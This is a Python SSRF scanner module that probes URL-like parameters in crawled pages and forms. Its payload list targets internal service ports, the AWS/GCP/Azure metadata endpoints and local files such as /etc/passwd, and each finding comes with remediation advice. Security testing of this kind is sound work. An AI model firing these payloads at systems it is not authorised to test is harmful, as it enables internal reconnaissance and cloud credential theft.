"""
SSRF Scanner - Production Grade
Techniques: Internal IP probing, Cloud metadata, Port scanning via SSRF,
DNS rebinding indicators, Protocol handlers (file://, dict://, gopher://)
Uses out-of-band detection concept + response analysis
"""
import requests, time, re, socket
from urllib.parse import urlparse, parse_qs

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
}

# Parameters that commonly accept URLs
URL_PARAM_KEYWORDS = {
    "url","uri","src","source","path","dest","destination","redirect",
    "link","host","target","callback","api","endpoint","site","domain",
    "proxy","fetch","load","resource","image","img","file","feed",
    "webhook","next","return","continue","data","location","address",
    "server","service","backend","remote","origin","ref","href",
    "action","goto","forward","page","request","get","download","import",
}

# SSRF payloads with expected response indicators
SSRF_TESTS = [
    # (payload, type, expected_indicators)
    ("http://127.0.0.1/",                "localhost",     ["html","<body","server","apache","nginx","200 ok","index"]),
    ("http://localhost/",                 "localhost_name",["html","<body","server","apache","nginx"]),
    ("http://127.0.0.1:22/",             "ssh",           ["ssh-","openssh","protocol 2.0","openssh_"]),
    ("http://127.0.0.1:3306/",           "mysql",         ["mysql","mariadb","5.","8.0","10.","is not allowed","host"]),
    ("http://127.0.0.1:5432/",           "postgres",      ["postgresql","pg_","invalid packet"]),
    ("http://127.0.0.1:6379/",           "redis",         ["+pong","-err","redis","*1\r\n","connected_clients"]),
    ("http://127.0.0.1:27017/",          "mongodb",       ["mongodb","ismaster","wireVersion"]),
    ("http://127.0.0.1:8080/",           "alt_http",      ["html","<body","server","200 ok"]),
    ("http://127.0.0.1:8443/",           "alt_https",     ["html","<body","server"]),
    ("http://169.254.169.254/latest/meta-data/", "aws_meta", ["ami-id","instance-id","hostname","local-ipv4","security-credentials","iam","placement"]),
    ("http://169.254.169.254/",          "cloud_meta",    ["ami-id","instance-id","computeMetadata","metadata"]),
    ("http://metadata.google.internal/", "gcp_meta",      ["computeMetadata","email","project-id","token"]),
    ("http://169.254.169.254/metadata/instance", "azure_meta", ["azEnvironment","location","resourceGroupName"]),
    ("http://192.168.0.1/",             "internal_192",   ["html","router","admin","login","gateway","192.168"]),
    ("http://10.0.0.1/",               "internal_10",    ["html","router","admin","login"]),
    ("file:///etc/passwd",             "file_passwd",    ["root:x:","daemon:x:","www-data","nobody:"]),
    ("file:///etc/hosts",              "file_hosts",     ["127.0.0.1","localhost","::1"]),
    ("file:///C:/Windows/win.ini",     "file_winini",    ["[fonts]","[extensions]","[mci"]),
    ("dict://127.0.0.1:6379/info",     "dict_redis",     ["redis_version","tcp_port","connected_clients"]),
]

# Status codes that indicate SSRF (server tried to connect)
SSRF_STATUS_HINTS = {500, 502, 503, 504, 400}

def is_url_param(name):
    name_l = name.lower()
    return name_l in URL_PARAM_KEYWORDS or any(k in name_l for k in URL_PARAM_KEYWORDS)

def analyze_ssrf_response(response_text, status_code, expected_indicators):
    """Check if response contains indicators of internal service access."""
    text_l = response_text.lower()

    for indicator in expected_indicators:
        if indicator.lower() in text_l:
            return True, f"Internal service indicator found: '{indicator}'"

    # Check for connection error messages that indicate SSRF attempt reached target
    connection_errors = [
        "connection refused", "connection timed out", "no route to host",
        "network unreachable", "failed to connect", "couldn't connect",
        "connection reset", "broken pipe", "address already in use",
        "operation timed out", "connection aborted",
    ]
    for err in connection_errors:
        if err in text_l:
            return True, f"SSRF reached target (connection error): '{err}'"

    # Unusual status codes with specific error messages
    if status_code in SSRF_STATUS_HINTS:
        ssrf_error_patterns = [
            r"error.*connect.*127\.",
            r"failed.*fetch.*localhost",
            r"unable.*reach.*internal",
            r"curl.*error",
            r"guzzle.*exception",
        ]
        for pat in ssrf_error_patterns:
            if re.search(pat, text_l):
                return True, f"HTTP {status_code} with SSRF error pattern"

    return False, None

def get_baseline(method, url, data, timeout=8):
    try:
        kw = dict(headers=HEADERS, timeout=timeout, verify=False, allow_redirects=False)
        if method == "POST":
            r = requests.post(url, data=data, **kw)
        else:
            r = requests.get(url, params=data, **kw)
        return r.text, r.status_code
    except:
        return "", 0

def test_ssrf_param(method, url, base_data, param, timeout=8):
    findings = []
    baseline_text, baseline_status = get_baseline(method, url, base_data, timeout)

    for payload, ptype, indicators in SSRF_TESTS[:12]:
        d = base_data.copy()
        d[param] = payload
        try:
            kw = dict(headers=HEADERS, timeout=timeout, verify=False, allow_redirects=False)
            if method == "POST":
                r = requests.post(url, data=d, **kw)
            else:
                r = requests.get(url, params=d, **kw)

            if r.text == baseline_text:
                time.sleep(0.05)
                continue

            vuln, reason = analyze_ssrf_response(r.text, r.status_code, indicators)
            if vuln:
                findings.append({
                    "vuln_type": "Server-Side Request Forgery (SSRF)",
                    "url": url, "parameter": param,
                    "payload": payload, "severity": "High",
                    "description": (
                        f"SSRF confirmed in param '{param}' via {method}. "
                        f"Target: {ptype.replace('_',' ')}. {reason}. "
                        f"Payload: {payload}"
                    ),
                    "recommendation": (
                        "1. Whitelist allowed domains/IPs — reject all others. "
                        "2. Block RFC1918 private IP ranges (10.x, 172.16-31.x, 192.168.x). "
                        "3. Disable unnecessary URL schemes (file://, dict://, gopher://). "
                        "4. Use DNS allowlist. 5. Deploy in network-segmented environment."
                    )
                })
                return findings
        except requests.exceptions.Timeout:
            # Timeout on internal address = possible SSRF
            if ptype in ["ssh","mysql","postgres","redis","mongodb"]:
                findings.append({
                    "vuln_type": "SSRF — Possible Internal Port Scan",
                    "url": url, "parameter": param,
                    "payload": payload, "severity": "Medium",
                    "description": (
                        f"Request to {payload} timed out — server may have attempted internal connection. "
                        f"Possible SSRF allowing internal port scanning."
                    ),
                    "recommendation": "Whitelist allowed URLs. Block RFC1918 addresses. Use network segmentation."
                })
                return findings
        except:
            pass
        time.sleep(0.05)
    return findings

def run_ssrf_scan(crawl_data, timeout=8):
    findings, seen = [], set()

    for page in crawl_data:
        # URL params
        parsed = urlparse(page["url"])
        qs = {k: v[0] for k,v in parse_qs(parsed.query).items()}
        url_params = [k for k in qs if is_url_param(k)]

        if url_params:
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            for param in url_params[:3]:
                key = f"{base_url}:{param}"
                if key in seen: continue
                for f in test_ssrf_param("GET", base_url, qs, param, timeout):
                    seen.add(key); findings.append(f)

        # Form params
        for form in page.get("forms", []):
            action = form.get("action") or page["url"]
            method = form.get("method","GET").upper()
            url_inputs = [i for i in form.get("inputs",[])
                         if i.get("name") and is_url_param(i["name"])
                         and i.get("type","text") not in ["submit","button","hidden"]]
            if not url_inputs: continue

            base_data = {i["name"]: i.get("value") or "http://example.com"
                        for i in form.get("inputs",[]) if i.get("name")}
            for inp in url_inputs[:2]:
                key = f"{action}:{inp['name']}"
                if key in seen: continue
                for f in test_ssrf_param(method, action, base_data, inp["name"], timeout):
                    seen.add(key); findings.append(f)

    return findings
